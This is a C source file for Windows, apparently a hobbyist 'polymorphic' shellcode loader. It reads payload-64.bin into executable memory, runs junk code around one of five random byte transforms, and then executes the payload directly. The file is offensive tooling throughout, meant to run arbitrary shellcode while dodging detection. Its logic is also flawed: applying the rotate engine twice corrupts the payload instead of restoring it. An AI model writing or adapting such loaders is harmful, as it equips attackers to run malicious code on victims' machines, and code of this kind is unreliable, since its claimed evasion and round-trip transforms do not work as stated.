// Compile: cl mk-1-polymorph.c /O2 /link user32.lib

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

typedef void(*ENGINE)(BYTE*, DWORD, BYTE);

// Heavy junk.......
static void junk() {
    volatile DWORD a = 0xDEADBEEF;
    a ^= GetTickCount();
    a = _rotl(a, 13);
    a += 0x11111111;
    Sleep(0);
    volatile BYTE b = 0xAA;
    b = ~b;
    b = _rotl8(b, 3);
}

#define JUNK do { for(int i=0;i<5+rand()%10;i++) junk(); } while(0)

// 5 engines........
static void eng_xor(BYTE* p, DWORD s, BYTE k)      { for(DWORD i=0;i<s;i++) p[i]^=k; }
static void eng_add(BYTE* p, DWORD s, BYTE k)      { for(DWORD i=0;i<s;i++) p[i]+=k; for(DWORD i=0;i<s;i++) p[i]-=k; }
static void eng_rol(BYTE* p, DWORD s, BYTE k)      { for(DWORD i=0;i<s;i++) p[i]=_rotl8(p[i],k&7); }
static void eng_rev(BYTE* p, DWORD s, BYTE k)      { for(DWORD i=0;i<s/2;i++) { BYTE t=p[i]; p[i]=p[s-1-i]; p[s-1-i]=t; } }
static void eng_not(BYTE* p, DWORD s, BYTE k)      { for(DWORD i=0;i<s;i++) p[i]=~p[i]; }

ENGINE engines[] = { eng_xor, eng_add, eng_rol, eng_rev, eng_not };
const int NUM = 5;

int main() {
    srand(GetTickCount() ^ time(NULL));

    HANDLE h = CreateFileA("payload-64.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) { printf("[-] Drop payload-64.bin here!\n"); return 1; }

    DWORD size = GetFileSize(h, NULL);
    BYTE* payload = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    ReadFile(h, payload, size, &size, NULL);
    CloseHandle(h);

    int e = rand() % NUM;
    BYTE k = (BYTE)rand();

    printf("[+] ELITE POLYMORPHIC ENGINE #%d/5 — size %d\n", e+1, size);

    JUNK;                    // heavy junk before
    engines[e](payload, size, k);
    engines[e](payload, size, k);
    JUNK;                    // heavy junk after

    printf("[+] Executing payload...\n");
    ((void(*)())payload)();

    VirtualFree(payload, 0, MEM_RELEASE);
    return 0;
}
